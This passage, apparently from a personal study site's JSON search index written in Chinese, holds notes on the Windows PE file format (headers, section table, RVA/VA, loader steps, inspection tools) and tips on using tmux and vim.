\u4e8b\u5b9e\u4e0a\uff0c\u4e00\u4e2a\u6587\u4ef6\u662f\u5426\u662f PE \u6587\u4ef6\u4e0e\u5176\u6269\u5c55\u540d\u65e0\u5173\uff0cEXE\u6587\u4ef6\u548cDLL\u6587\u4ef6\u7684\u533a\u522b\u5b8c\u5168\u662f\u8bed\u4e49\u4e0a\u7684\u3002\u5b83\u4eec\u4f7f\u7528\u5b8c\u5168\u76f8\u540c\u7684PE\u683c\u5f0f\uff0c\u552f\u4e00\u7684\u533a\u522b\u5c31\u662f\u7528\u4e00\u4e2a\u5b57\u6bb5\u6807\u8bc6\u51fa\u8fd9\u4e2a\u6587\u4ef6\u662fEXE\u8fd8\u662fDLL\u3002","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"MalwareAnalysis/knowledge/ch1/#_8","text":"\u79cd\u7c7b \u4e3b\u6269\u5c55\u540d \u53ef\u6267\u884c\u7cfb\u5217 EXE, SCR \u5e93\u7cfb\u5217 DLL, OCX, CPL, DRV \u9a71\u52a8\u7a0b\u5e8f\u7cfb\u5217 SYS, VXD \u5bf9\u8c61\u6587\u4ef6\u7cfb\u5217 OBJ ### \u57fa\u672c\u5f62\u5f0f PE\u6587\u4ef6\u4f7f\u7528\u7684\u662f\u4e00\u4e2a\u5e73\u9762\u5730\u5740\u7a7a\u95f4\uff0c\u6240\u6709\u4ee3\u7801\u548c\u6570\u636e\u90fd\u88ab\u5408\u5e76\u5728\u4e00\u8d77\uff0c\u7ec4\u6210\u4e00\u4e2a\u5f88\u5927\u7684\u7ed3\u6784\u3002\u6587\u4ef6\u7684\u5185\u5bb9\u88ab\u5206\u5272\u4e3a\u4e0d\u540c\u7684\u533a\u5757\uff08Section\uff0c\u53c8\u79f0\u533a\u6bb5\u3001\u8282\u7b49\uff09\uff0c\u533a\u5757\u4e2d\u5305\u542b\u4ee3\u7801\u6216\u6570\u636e\uff0c\u5404\u4e2a\u533a\u5757\u6309\u9875\u8fb9\u754c\u6765\u5bf9\u9f50\uff0c\u533a\u5757\u6ca1\u6709\u5927\u5c0f\u9650\u5236\uff0c\u662f\u4e00\u4e2a\u8fde\u7eed\u7ed3\u6784\u3002\u6bcf\u4e2a\u5757\u90fd\u6709\u5b83\u81ea\u5df1\u5728\u5185\u5b58\u4e2d\u7684\u4e00\u5957\u5c5e\u6027\uff0c\u6bd4\u5982\uff1a\u8fd9\u4e2a\u5757\u662f\u5426\u5305\u542b\u4ee3\u7801\u3001\u662f\u5426\u53ea\u8bfb\u6216\u53ef\u8bfb/\u5199\u7b49\u3002 ### \u5177\u4f53\u7ed3\u6784 1. DOS\u5934 \u662f\u7528\u6765\u517c\u5bb9 MS-DOS \u64cd\u4f5c\u7cfb\u7edf\u7684\uff0c\u76ee\u7684\u662f\u5f53\u8fd9\u4e2a\u6587\u4ef6\u5728 MS-DOS \u4e0a\u8fd0\u884c\u65f6\u63d0\u793a\u4e00\u6bb5\u6587\u5b57\uff0c\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u662f\uff1aThis program cannot be run in DOS mode. \u8fd8\u6709\u4e00\u4e2a\u76ee\u7684\uff0c\u5c31\u662f\u6307\u660e NT \u5934\u5728\u6587\u4ef6\u4e2d\u7684\u4f4d\u7f6e\u3002 2. NT\u5934 \u5305\u542b windows PE \u6587\u4ef6\u7684\u4e3b\u8981\u4fe1\u606f\uff0c\u5176\u4e2d\u5305\u62ec\u4e00\u4e2a 'PE' \u5b57\u6837\u7684\u7b7e\u540d\uff0cPE\u6587\u4ef6\u5934\uff08IMAGE_FILE_HEADER\uff09\u548c PE\u53ef\u9009\u5934\uff08IMAGE_OPTIONAL_HEADER32\uff09\u3002 3. \u8282\u8868\uff1a\u662f PE \u6587\u4ef6\u540e\u7eed\u8282\u7684\u63cf\u8ff0\uff0cwindows \u6839\u636e\u8282\u8868\u7684\u63cf\u8ff0\u52a0\u8f7d\u6bcf\u4e2a\u8282\u3002 4. \u8282\uff1a\u6bcf\u4e2a\u8282\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u5bb9\u5668\uff0c\u53ef\u4ee5\u5305\u542b \u4ee3\u7801\u3001\u6570\u636e \u7b49\u7b49\uff0c\u6bcf\u4e2a\u8282\u53ef\u4ee5\u6709\u72ec\u7acb\u7684\u5185\u5b58\u6743\u9650\uff0c\u6bd4\u5982\u4ee3\u7801\u8282\u9ed8\u8ba4\u6709\u8bfb/\u6267\u884c\u6743\u9650\uff0c\u8282\u7684\u540d\u5b57\u548c\u6570\u91cf\u53ef\u4ee5\u81ea\u5df1\u5b9a\u4e49\uff0c\u672a\u5fc5\u662f\u4e0a\u56fe\u4e2d\u7684\u4e09\u4e2a\u3002","title":"\u79cd\u7c7b"},{"location":"MalwareAnalysis/knowledge/ch1/#rva-va","text":"\u76f8\u5bf9\u865a\u62df\u5730\u5740RVA\u4e0e\u865a\u62df\u5730\u5740VA \u5f53\u4e00\u4e2a PE \u6587\u4ef6\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u4ee5\u540e\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3a \" \u6620\u8c61 \"\uff08image\uff09\uff0c\u4e00\u822c\u6765\u8bf4\uff0cPE\u6587\u4ef6\u5728\u786c\u76d8\u4e0a\u548c\u5728\u5185\u5b58\u91cc\u662f\u4e0d\u5b8c\u5168\u4e00\u6837\u7684\uff0c\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4ee5\u540e\u5176\u5360\u7528\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u8981\u6bd4\u5728\u786c\u76d8\u4e0a\u5360\u7528\u7684\u7a7a\u95f4\u5927\u4e00\u4e9b\uff0c\u8fd9\u662f\u56e0\u4e3a\u5404\u4e2a\u8282\u5728\u786c\u76d8\u4e0a\u662f\u8fde\u7eed\u7684\uff0c\u800c\u5728\u5185\u5b58\u4e2d\u662f\u6309\u9875\u5bf9\u9f50\u7684\uff0c\u6240\u4ee5\u52a0\u8f7d\u5230\u5185\u5b58\u4ee5\u540e\u8282\u4e4b\u95f4\u4f1a\u51fa\u73b0\u4e00\u4e9b \u201c\u7a7a\u6d1e\u201d \u3002 \u56e0\u4e3a\u5b58\u5728\u8fd9\u79cd\u5bf9\u9f50\uff0c\u6240\u4ee5\u5728 PE \u7ed3\u6784\u5185\u90e8\uff0c\u8868\u793a\u67d0\u4e2a\u4f4d\u7f6e\u7684\u5730\u5740\u91c7\u7528\u4e86\u4e24\u79cd\u65b9\u5f0f\uff1a \u9488\u5bf9\u5728\u786c\u76d8\u4e0a\u5b58\u50a8\u6587\u4ef6\u4e2d\u7684\u5730\u5740\uff0c\u79f0\u4e3a \u539f\u59cb\u5b58\u50a8\u5730\u5740 \u6216 \u7269\u7406\u5730\u5740\uff0c\u8868\u793a \u8ddd\u79bb\u6587\u4ef6\u5934\u7684\u504f\u79fb\u3002 \u9488\u5bf9\u52a0\u8f7d\u5230\u5185\u5b58\u4ee5\u540e\u6620\u8c61\u4e2d\u7684\u5730\u5740\uff0c\u79f0\u4e3a \u76f8\u5bf9\u865a\u62df\u5730\u5740\uff08RVA\uff09\uff0c\u8868\u793a\u76f8\u5bf9\u5185\u5b58\u6620\u8c61\u5934\u7684\u504f\u79fb\u3002 \u8fd9\u91cc\u9700\u8981\u77e5\u9053\u7684\u662fRVA=VA-ImageBase","title":"RVA VA"},{"location":"MalwareAnalysis/knowledge/ch1/#_9","text":"","title":"\u7ed3\u6784"},{"location":"MalwareAnalysis/knowledge/ch1/#dos","text":"\u7531MZ\u5934\u548cDOS\u5b58\u6839\u7ec4\u6210 MZ \u5934\u90e8\u662f\u771f\u6b63\u7684DOS\u5934\u90e8\uff0c\u7531\u4e8e\u5176\u5f00\u59cb\u5904\u7684\u4e24\u4e2a\u5b57\u8282\u4e3a\u201cMZ\u201d\uff0c\u56e0\u6b64DOS\u5934\u4e5f\u53ef\u4ee5\u53eb\u4f5cMZ\u5934\u3002\u8be5\u90e8\u5206\u7528\u4e8e\u7a0b\u5e8f\u5728DOS\u7cfb\u7edf\u4e0b\u52a0\u8f7d\uff0c\u5b83\u7684\u7ed3\u6784\u88ab\u5b9a\u4e49\u4e3aIMAGE_DOS_HEADER\u3002 \u5176\u4e2d\uff0c\u503c\u5f97\u6ce8\u610f\u7684\u662fe_magic\u5b57\u6bb5\u548ce_lfanew\u5b57\u6bb5 e_magic\u5b57\u6bb5\u5360\u4e24\u4e2a\u5b57\u8282\uff0c\u503c\u4e3a 0x5A4D \uff0c\u5bf9\u5e94ASCII\u7801\u503c\u4e3a 'MZ' \uff0c\"MZ\"\u5176\u5b9e\u662fMS-DOS\u7684\u521b\u5efa\u8005\u4e4b\u4e00Mark Zbikowski\u540d\u5b57\u7684\u7f29\u5199\u3002 e_lfanew\u5b57\u6bb5\u53604\u4e2a\u5b57\u8282\uff0c\u4f4d\u4e8e\u4ece\u6587\u4ef6\u5f00\u59cb\u504f\u79fb 3Ch \u5b57\u8282\u5904\uff0c\u7528\u4e8e\u6307\u51faNT\u5934\u7684\u504f\u79fb\u5730\u5740 typedef struct _IMAGE_DOS_HEADER { WORD e_magic; //\u9b54\u672f\u6570\u5b57 WORD e_cblp; //\u6587\u4ef6\u6700\u540e\u9875\u7684\u5b57\u8282\u6570 WORD e_cp; //\u6587\u4ef6\u9875\u6570 WORD e_crlc; //\u91cd\u5b9a\u4e49\u5143\u7d20\u4e2a\u6570 WORD e_cparhdr; //\u5934\u90e8\u5c3a\u5bf8\uff0c\u4ee5\u6bb5\u843d\u4e3a\u5355\u4f4d WORD e_minalloc; //\u6240\u9700\u7684\u6700\u5c0f\u9644\u52a0\u6bb5 WORD e_maxalloc; //\u6240\u9700\u7684\u6700\u5927\u9644\u52a0\u6bb5 WORD e_ss; //\u521d\u59cb\u7684SS\u503c\uff08\u76f8\u5bf9\u504f\u79fb\u91cf\uff09 WORD e_sp; //\u521d\u59cb\u7684SP\u503c WORD e_csum; //\u6821\u9a8c\u548c WORD e_ip; //\u521d\u59cb\u7684IP\u503c WORD e_cs; //\u521d\u59cb\u7684CS\u503c\uff08\u76f8\u5bf9\u504f\u79fb\u91cf\uff09 WORD e_lfarlc; //\u91cd\u5206\u914d\u8868\u6587\u4ef6\u5730\u5740 WORD e_ovno; //\u8986\u76d6\u53f7 WORD e_res[4]; //\u4fdd\u7559\u5b57 WORD e_oemid; //OEM\u6807\u8bc6\u7b26\uff08\u76f8\u5bf9e_oeminfo\uff09 WORD e_oeminfo; //OEM\u4fe1\u606f WORD e_res2[10]; //\u4fdd\u7559\u5b57 LONG e_lfanew; //\u65b0exe\u5934\u90e8\u7684\u6587\u4ef6\u4f4d\u7f6e } IMAGE_DOS_HEADER,*PIMAGE_DOS_HEADER;","title":"DOS\u5934"},{"location":"MalwareAnalysis/knowledge/ch1/#nt","text":"PE\u6700\u91cd\u8981\u7684\u5934\uff0c\u7531 DOS \u5934\u4e2d\u7684 e_lfanew \u51b3\u5b9a \uff0c\u8868\u793a DOS\u5934\u4e4b\u540e\u7684 NT\u5934\u76f8\u5bf9\u6587\u4ef6\u8d77\u59cb\u5730\u5740\u7684\u504f\u79fb \u5de8\u6076\u5fc3\u7684\u4e00\u5927\u5768\u4e1c\u897f\u3002 \u8fd9\u4e00\u5757\u513f\u6700\u91cd\u8981\u7684\u662f\u5bfc\u5165\u8868\u3001\u5bfc\u51fa\u8868\u3001\u8d44\u6e90\u76ee\u5f55\u7b49\u3002 \u8fd9\u91cc\u65e5\u540e\u7528\u5230\u4e86\u518d\u5199\uff0c\u8fd9\u4e00\u5768\u662f\u771f\u7684\u6076\u5fc3","title":"NT\u5934"},{"location":"MalwareAnalysis/knowledge/ch1/#_10","text":"\u8282\u8868Section Table\u662f\u4e00\u4e2a\u7ed3\u6784\u6570\u7ec4\uff0c\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f\u4e00\u4e2aIMAGE_SECTION_HEADER\u7ed3\u6784\uff0c\u5305\u542b\u4e86\u5bf9\u5e94\u8282\u7684\u5c5e\u6027\u3001\u6587\u4ef6\u504f\u79fb\u91cf\u3001\u865a\u62df\u504f\u79fb\u91cf\u7b49\u3002 typedef struct _IMAGE_SECTION_HEADER { +000h BYTE Name[8]; //\u8282\u540d\u79f0\uff0c\u5982\".text\" union { +008h DWORD PhysicalAddress; // \u7269\u7406\u5730\u5740 +008h DWORD VirtualSize; // \u8282\u957f\u5ea6 } Misc; +00Ch DWORD VirtualAddress; // RVA +010h DWORD SizeOfRawData; // \u5bf9\u9f50\u540e\u7684\u8282\u5c3a\u5bf8 +014h DWORD PointerToRawData; // \u57fa\u4e8e\u6587\u4ef6\u7684\u504f\u79fb +018h DWORD PointerToRelocations; // \u91cd\u5b9a\u4f4d\u7684\u504f\u79fb +01Ch DWORD PointerToLinenumbers; // \u884c\u53f7\u8868\u7684\u504f\u79fb +020h WORD NumberOfRelocations; // \u91cd\u5b9a\u4f4d\u9879\u6570\u76ee +022h WORD NumberOfLinenumbers; // \u884c\u53f7\u8868\u4e2d\u884c\u53f7\u6570\u76ee +024h DWORD Characteristics; // \u8282\u5c5e\u6027 } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;","title":"\u8282\u8868"},{"location":"MalwareAnalysis/knowledge/ch1/#pe_1","text":"\u5f53\u4e00\u4e2a PE \u6587\u4ef6 \u88ab\u6267\u884c\u65f6\uff0cPE \u88c5\u8f7d\u5668 \u9996\u5148\u68c0\u67e5 DOS header \u91cc\u7684 PE header \u7684\u504f\u79fb\u91cf\u3002\u5982\u679c\u627e\u5230\uff0c\u5219\u76f4\u63a5\u8df3\u8f6c\u5230 PE header \u7684\u4f4d\u7f6e\u3002 \u5f53 PE\u88c5\u8f7d\u5668 \u8df3\u8f6c\u5230 PE header \u540e\uff0c\u7b2c\u4e8c\u6b65\u8981\u505a\u7684\u5c31\u662f2. \u68c0\u67e5 PE header \u662f\u5426\u6709\u6548\u3002\u5982\u679c\u8be5 PE header \u6709\u6548\uff0c\u5c31\u8df3\u8f6c\u5230 PE header \u7684\u5c3e\u90e8\u3002 \u7d27\u8ddf PE header \u5c3e\u90e8\u7684\u662f\u8282\u8868\u3002PE\u88c5\u8f7d\u5668\u6267\u884c\u5b8c\u7b2c\u4e8c\u6b65\u540e\u5f00\u59cb\u8bfb\u53d6\u8282\u8868\u4e2d\u7684\u8282\u6bb5\u4fe1\u606f\uff0c\u5e76\u91c7\u7528\u6587\u4ef6\u6620\u5c04\uff08 \u5728\u6267\u884c\u4e00\u4e2aPE\u6587\u4ef6\u7684\u65f6\u5019\uff0cWindows\u5e76\u4e0d\u5728\u4e00\u5f00\u59cb\u5c31\u5c06\u6574\u4e2a\u6587\u4ef6\u8bfb\u5165\u5185\u5b58\uff0c\u800c\u662f\u91c7\u7528\u4e0e\u5185\u5b58\u6620\u5c04\u7684\u673a\u5236\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0cWindows\u88c5\u8f7d\u5668\u5728\u88c5\u8f7d\u7684\u65f6\u5019\u4ec5\u4ec5\u5efa\u7acb\u597d\u865a\u62df\u5730\u5740\u548cPE\u6587\u4ef6\u4e4b\u95f4\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u53ea\u6709\u771f\u6b63\u6267\u884c\u5230\u67d0\u4e2a\u5185\u5b58\u9875\u4e2d\u7684\u6307\u4ee4\u6216\u8005\u8bbf\u95ee\u67d0\u4e00\u9875\u4e2d\u7684\u6570\u636e\u65f6\uff0c\u8fd9\u4e2a\u9875\u9762\u624d\u4f1a\u88ab\u4ece\u78c1\u76d8\u63d0\u4ea4\u5230\u7269\u7406\u5185\u5b58\uff0c\u8fd9\u79cd\u673a\u5236\u4f7f\u6587\u4ef6\u88c5\u5165\u7684\u901f\u5ea6\u548c\u6587\u4ef6\u5927\u5c0f\u6ca1\u6709\u592a\u5927\u7684\u5173\u7cfb \uff09\u7684\u65b9\u6cd5\u5c06\u8fd9\u4e9b\u8282\u6bb5\u6620\u5c04\u5230\u5185\u5b58\uff0c\u540c\u65f6\u9644\u4e0a\u8282\u8868\u91cc\u6307\u5b9a\u8282\u6bb5\u7684\u8bfb\u5199\u5c5e\u6027\u3002 PE\u6587\u4ef6\u6620\u5c04\u5165\u5185\u5b58\u540e\uff0cPE\u88c5\u8f7d\u5668\u5c06\u7ee7\u7eed\u5904\u7406PE\u6587\u4ef6\u4e2d\u7c7b\u4f3c import table \uff08\u8f93\u5165\u8868\uff09\u7684\u903b\u8f91\u90e8\u5206\u3002","title":"PE \u6587\u4ef6\u7684\u6267\u884c\u987a\u5e8f"},{"location":"MalwareAnalysis/knowledge/ch1/#ref","text":"\u535a\u5ba2 \u8fd9\u4e2a\u5f88\u7ec6\uff0c\u5efa\u8bae\u548c\u4e0a\u9762\u90a3\u4e2a\u7ed3\u5408\u770b \u8fd9\u4e2a\u5f88\u6e05\u695a\uff0c\u6709\u7b80\u8981\u7684\u8981\u70b9","title":"ref"},{"location":"MalwareAnalysis/knowledge/ch1/#dependency-walker","text":"\u662f\u4e2a\u5de5\u5177\uff0c\u63a2\u7d22\u52a8\u6001\u94fe\u63a5\u51fd\u6570\u7684\u3002","title":"Dependency Walker"},{"location":"MalwareAnalysis/knowledge/ch1/#dll","text":"","title":"\u5e38\u89c1\u7684DLL"},{"location":"MalwareAnalysis/knowledge/ch1/#_11","text":"Ex,\u662f\u5fae\u8f6f\u5728\u66f4\u65b0\u65b0\u51fd\u6570\u548c\u65e7\u51fd\u6570\u4e0d\u517c\u5bb9\u65f6\u52a0\u5165\u7684\u4e1c\u897f\u3002 \u800cA\u548cW\u7ed3\u5c3e\u662f\u6307\u63a5\u53d7\u53c2\u6570\u5206\u522b\u662fascii\u548cunicode","title":"\u51fd\u6570\u547d\u540d\u7ea6\u5b9a"},{"location":"MalwareAnalysis/knowledge/ch1/#_12","text":"\u9700\u8981\u81ea\u5df1\u719f\u6089\u4e00\u4e9bwindows\u51fd\u6570","title":"\u5bfc\u5165\u5bfc\u51fa"},{"location":"MalwareAnalysis/knowledge/ch1/#peview","text":"\u5de5\u5177\uff0c\u67e5\u770bPE\u6587\u4ef6\u683c\u5f0f\u7684","title":"PEview"},{"location":"MalwareAnalysis/knowledge/ch1/#resource-hacker","text":"\u5de5\u5177\uff0c\u67e5\u770b\u8d44\u6e90\u8282","title":"Resource Hacker"},{"location":"MalwareAnalysis/knowledge/ch1/#_13","text":"PEBrowse Professional PE Explorer","title":"\u5176\u4ed6\u5de5\u5177"},{"location":"Useful-tools/","text":"WHY I WRITE THIS? \u5728pwn.college\u4e4b\u4e2d\uff0c\u53cd\u6b63\u7531\u4e8e\u6211\u7f51\u4e0d\u884c\uff0c\u90a3\u4e2a\u56fe\u5f62\u5316\u754c\u9762\u513f\u6211\u7279\u522b\u5361\uff0c\u6211\u57fa\u672c\u4e0a\u80fd\u4e0d\u7528\u6211\u5c31\u4e0d\u7528\uff0c\u4e00\u5f00\u59cb\u641e\u90a3\u4e2awireshark\u5dee\u70b9\u513f\u5361\u7834\u9632\u4e86\u3002\u53e6\u5916\u4e00\u4e2a\u539f\u56e0\u6211\u5199\u5728\u4e86cse365\u7684wp\u91cc\u9762\uff0c\u5c31\u662f\u6d89\u53ca\u5230\u53ea\u6709\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e0b\u624d\u80fd\u76d1\u542c\u8fd9\u4ef6\u4e8b\u3002\u56e0\u6b64\uff0ctmux\u548cvim\u53c8\u63d0\u4e0a\u65e5\u7a0b\u4e86\u3002\u5f53\u7136\uff0c\u6700\u91cd\u8981\u7684\u539f\u56e0\u662f\uff0c\u6211\u5e0c\u671b\u628avim\u641e\u6210\u4e00\u4e2a\u597d\u7528\u7684IDE\u3002","title":"WHY I WRITE THIS?"},{"location":"Useful-tools/#why-i-write-this","text":"\u5728pwn.college\u4e4b\u4e2d\uff0c\u53cd\u6b63\u7531\u4e8e\u6211\u7f51\u4e0d\u884c\uff0c\u90a3\u4e2a\u56fe\u5f62\u5316\u754c\u9762\u513f\u6211\u7279\u522b\u5361\uff0c\u6211\u57fa\u672c\u4e0a\u80fd\u4e0d\u7528\u6211\u5c31\u4e0d\u7528\uff0c\u4e00\u5f00\u59cb\u641e\u90a3\u4e2awireshark\u5dee\u70b9\u513f\u5361\u7834\u9632\u4e86\u3002\u53e6\u5916\u4e00\u4e2a\u539f\u56e0\u6211\u5199\u5728\u4e86cse365\u7684wp\u91cc\u9762\uff0c\u5c31\u662f\u6d89\u53ca\u5230\u53ea\u6709\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e0b\u624d\u80fd\u76d1\u542c\u8fd9\u4ef6\u4e8b\u3002\u56e0\u6b64\uff0ctmux\u548cvim\u53c8\u63d0\u4e0a\u65e5\u7a0b\u4e86\u3002\u5f53\u7136\uff0c\u6700\u91cd\u8981\u7684\u539f\u56e0\u662f\uff0c\u6211\u5e0c\u671b\u628avim\u641e\u6210\u4e00\u4e2a\u597d\u7528\u7684IDE\u3002","title":"WHY I WRITE THIS?"},{"location":"Useful-tools/tmux/","text":"TMUX","title":"TMUX"},{"location":"Useful-tools/tmux/#tmux","text":"","title":"TMUX"},{"location":"Useful-tools/vim/","text":"Vim\u5b9e\u7528\u6280\u5de7 \u8fd9\u672c\u4e66\u5e94\u8be5\u53cd\u590d\u770b\u3001\u53cd\u590d\u770b\u3001\u53cd\u590d\u770b\uff01 basic \u9996\u5148\u4f60\u9700\u8981\u4f1a\u4e00\u4e9b\u57fa\u7840\u6027\u7684\u64cd\u4f5c \u6280\u5de71 \u4f7f\u7528 . \u547d\u4ee4\u6765\u91cd\u590d \u6280\u5de72 \u5f88\u591aVim\u7684\u5355\u952e\u547d\u4ee4\u90fd\u53ef\u4ee5\u88ab\u770b\u6210\u4e24\u4e2a\u6216\u591a\u4e2a\u5176\u4ed6\u547d\u4ee4\u7684\u7ec4\u5408 \u6280\u5de73 f\u67e5\u627e\uff0cs\u5220\u9664\uff0c\u5206\u53f7\u4f1a\u7ee7\u7eed\u67e5\u627e \u6280\u5de74 \u76ee\u7684 \u64cd\u4f5c \u91cd\u590d \u56de\u9000 \u505a\u51fa\u4e00\u4e2a\u4fee\u6539 {edit} . u \u5728\u884c\u5185\u67e5\u627e\u4e0b\u4e00\u6307\u5b9a\u5b57\u7b26 f{char}/t{char} ; , \u5728\u884c\u5185\u67e5\u627e\u4e0a\u4e00\u6307\u5b9a\u5b57\u7b26 F{char}/T{char} ; , \u5728\u6587\u6863\u4e2d\u67e5\u627e\u4e0b\u4e00\u5904\u5339\u914d\u9879 /pattern n N \u5728\u6587\u6863\u4e2d\u67e5\u627e\u4e0a\u4e00\u5904\u5339\u914d\u9879 ?pattern n N \u6267\u884c\u66ff\u6362 :s/target/replacement & u \u6267\u884c\u4e00\u7cfb\u5217\u4fee\u6539 qx{changes}q @x u ## \u6280\u5de75 \u6309 * \u641c\u7d22\uff0cc\u662f\u4fee\u6539 Vim \u4ece\u5165\u95e8\u5230\u7cbe\u901a \u7f51\u5740\u5728\u8fd9\u513f vim\u54f2\u5b66 \u51cf\u5c11\u8ba4\u8bc6\u8d1f\u8377\u5e76\u5e2e\u52a9\u4eba\u4eec\u4e13\u6ce8\u4e8e\u5b9e\u9645\u4efb\u52a1 \u7f13\u51b2\u533a\uff0c\u7a97\u53e3\uff0c\u6807\u7b7e \u7f13\u51b2\u533a\u662f\u5de5\u4f5c\u7684\u5730\u65b9\uff0c\u7a97\u53e3\u662f\u7f13\u51b2\u533a\u7684\u89c6\u7a97\uff0c\u6807\u7b7e\u662f\u7a97\u53e3\u7684\u96c6\u5408\u3002 \u5df2\u6fc0\u6d3b\u3001\u5df2\u8f7d\u5165\u3001\u5df2\u5217\u51fa\u3001\u5df2\u547d\u540d\u7684\u7f13\u51b2\u533a \u7528\u7c7b\u4f3c vim file1 \u7684\u547d\u4ee4\u542f\u52a8 Vim \u3002\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u5c06\u4f1a\u88ab\u52a0\u8f7d\u5230\u7f13\u51b2\u533a\u4e2d\uff0c\u4f60\u73b0\u5728\u6709\u4e00\u4e2a\u5df2\u8f7d\u5165\u7684\u7f13\u51b2\u533a\u3002\u5982\u679c\u4f60\u5728 Vim \u4e2d\u4fdd\u5b58\u8fd9\u4e2a\u6587\u4ef6\uff0c\u7f13\u51b2\u533a\u5185\u5bb9\u5c06\u4f1a\u88ab\u540c\u6b65\u5230\u78c1\u76d8\u4e0a\uff08\u5199\u56de\u6587\u4ef6\u4e2d\uff09\u3002 \u7531\u4e8e\u8fd9\u4e2a\u7f13\u51b2\u533a\u4e5f\u5728\u4e00\u4e2a\u7a97\u53e3\u4e0a\u663e\u793a\uff0c\u6240\u4ee5\u4ed6\u4e5f\u662f\u4e00\u4e2a\u5df2\u6fc0\u6d3b\u7684\u7f13\u51b2\u533a\u3002\u5982\u679c\u4f60\u73b0\u5728\u901a\u8fc7 :e file2 \u547d\u4ee4\u52a0\u8f7d\u53e6\u4e00\u4e2a\u6587\u4ef6\uff0cfile1 \u5c06\u4f1a\u53d8\u6210\u4e00\u4e2a\u9690\u85cf\u7684\u7f13\u51b2\u533a\uff0c\u5e76\u4e14 file2 \u53d8\u6210\u5df2\u6fc0\u6d3b\u7f13\u51b2\u533a\u3002 \u4f7f\u7528 :ls \u6211\u4eec\u80fd\u591f\u5217\u51fa\u6240\u6709\u53ef\u4ee5\u5217\u51fa\u7684\u7f13\u51b2\u533a\u3002\u63d2\u4ef6\u7f13\u51b2\u533a\u548c\u5e2e\u52a9\u7f13\u51b2\u533a\u901a\u5e38\u88ab\u6807\u8bb0\u4e3a\u4e0d\u53ef\u4ee5\u5217\u51fa\u7684\u7f13\u51b2\u533a\uff0c\u56e0\u4e3a\u90a3\u5e76\u4e0d\u662f\u4f60\u7ecf\u5e38\u9700\u8981\u5728\u7f16\u8f91\u5668\u4e2d\u7f16\u8f91\u7684\u5e38\u89c4\u6587\u4ef6\u3002\u901a\u8fc7 :ls! \u547d\u4ee4\u53ef\u4ee5\u663e\u793a\u88ab\u653e\u5165\u7f13\u51b2\u533a\u5217\u8868\u7684\u548c\u672a\u88ab\u653e\u5165\u5217\u8868\u7684\u7f13\u51b2\u533a\u3002 \u672a\u547d\u540d\u7684\u7f13\u51b2\u533a\u662f\u4e00\u79cd\u6ca1\u6709\u5173\u8054\u7279\u5b9a\u6587\u4ef6\u7684\u7f13\u51b2\u533a\uff0c\u8fd9\u79cd\u7f13\u51b2\u533a\u7ecf\u5e38\u88ab\u63d2\u4ef6\u4f7f\u7528\u3002\u6bd4\u5982 :enew \u5c06\u4f1a\u521b\u5efa\u4e00\u4e2a\u65e0\u540d\u4e34\u65f6\u7f13\u51b2\u533a\u3002\u6dfb\u52a0\u4e00\u4e9b\u6587\u672c\u7136\u540e\u4f7f\u7528 :w /tmp/foo \u5c06\u4ed6\u5199\u5165\u5230\u78c1\u76d8\uff0c\u8fd9\u6837\u8fd9\u4e2a\u7f13\u51b2\u533a\u5c31\u4f1a\u53d8\u6210\u4e00\u4e2a\u5df2\u547d\u540d\u7684\u7f13\u51b2\u533a\u3002 \u5bc4\u5b58\u5668 \u7c7b\u578b \u6807\u8bc6 \u8bfb\u5199\u8005 \u662f\u5426\u4e3a\u53ea\u8bfb \u5305\u542b\u7684\u5b57\u7b26\u6765\u6e90 Unnamed \" vim \u5426 \u6700\u8fd1\u4e00\u6b21\u7684\u590d\u5236\u6216\u5220\u9664\u64cd\u4f5c ( d , c , s , x , y ) Numbered 0 \u81f3 9 vim \u5426 \u5bc4\u5b58\u5668 0 : \u6700\u8fd1\u4e00\u6b21\u590d\u5236\u3002\u5bc4\u5b58\u5668 1 : \u6700\u8fd1\u4e00\u6b21\u5220\u9664\u3002\u5bc4\u5b58\u5668 2 : \u5012\u6570\u7b2c\u4e8c\u6b21\u5220\u9664\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\u5bf9\u4e8e\u5bc4\u5b58\u5668 1 \u81f3 9 \uff0c\u4ed6\u4eec\u5176\u5b9e\u662f\u53ea\u8bfb\u7684\u6700\u591a\u5305\u542b 9 \u4e2a\u5143\u7d20\u7684\u961f\u5217\u3002\u8fd9\u91cc\u7684\u961f\u5217\u5373\u4e3a\u6570\u636e\u7c7b\u578b queue Small delete - vim \u5426 \u6700\u8fd1\u4e00\u6b21\u884c\u5185\u5220\u9664 Named a \u81f3 z , A \u81f3 Z \u7528\u6237 \u5426 \u5982\u679c\u4f60\u901a\u8fc7\u590d\u5236\u64cd\u4f5c\u5b58\u50a8\u6587\u672c\u81f3\u5bc4\u5b58\u5668 a \uff0c\u90a3\u4e48 a \u4e2d\u7684\u6587\u672c\u5c31\u4f1a\u88ab\u5b8c\u5168\u8986\u76d6\u3002\u5982\u679c\u4f60\u5b58\u50a8\u81f3 A \uff0c\u90a3\u4e48\u4f1a\u5c06\u6587\u672c\u6dfb\u52a0\u7ed9\u5bc4\u5b58\u5668 a \uff0c\u4e0d\u4f1a\u8986\u76d6\u4e4b\u524d\u5df2\u6709\u7684\u6587\u672c Read-only : \u4e0e . \u548c % vim \u662f : : \u6700\u8fd1\u4e00\u6b21\u4f7f\u7528\u7684\u547d\u4ee4\uff0c . : \u6700\u8fd1\u4e00\u6b21\u6dfb\u52a0\u7684\u6587\u672c\uff0c % : \u5f53\u524d\u7684\u6587\u4ef6\u540d Alternate buffer # vim \u5426 \u5927\u90e8\u5206\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u5bc4\u5b58\u5668\u662f\u5f53\u524d\u7a97\u53e3\u4e2d\uff0c\u4e0a\u4e00\u6b21\u8bbf\u95ee\u7684\u7f13\u51b2\u533a\u3002\u8bf7\u53c2\u9605 :h 